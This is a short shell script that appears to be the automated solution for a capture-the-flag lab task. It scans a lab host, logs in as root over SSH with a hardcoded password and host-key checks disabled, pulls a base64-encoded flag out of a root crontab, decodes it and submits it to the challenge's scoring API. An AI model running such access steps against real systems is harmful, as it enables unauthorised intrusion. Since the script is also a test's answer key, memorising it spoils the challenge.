#!/bin/sh
set -eu
HOST='172.20.0.141'
USER='root'
PASSWORD='orbital-archive-47'
CHALLENGE_ID='scl-challenge-frame-f86b8d'

nmap -Pn -p 22 "$HOST" >/dev/null
encoded=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" "awk '/telemetry-forwarder/ {print \$NF}' /var/spool/cron/crontabs/maint")
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())')
payload=$(CHALLENGE_ID="$CHALLENGE_ID" FLAG_VALUE="$flag" python3 -c 'import json,os; print(json.dumps({"challenge_id":os.environ["CHALLENGE_ID"],"task_id":"task1","flag":os.environ["FLAG_VALUE"]}))')
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
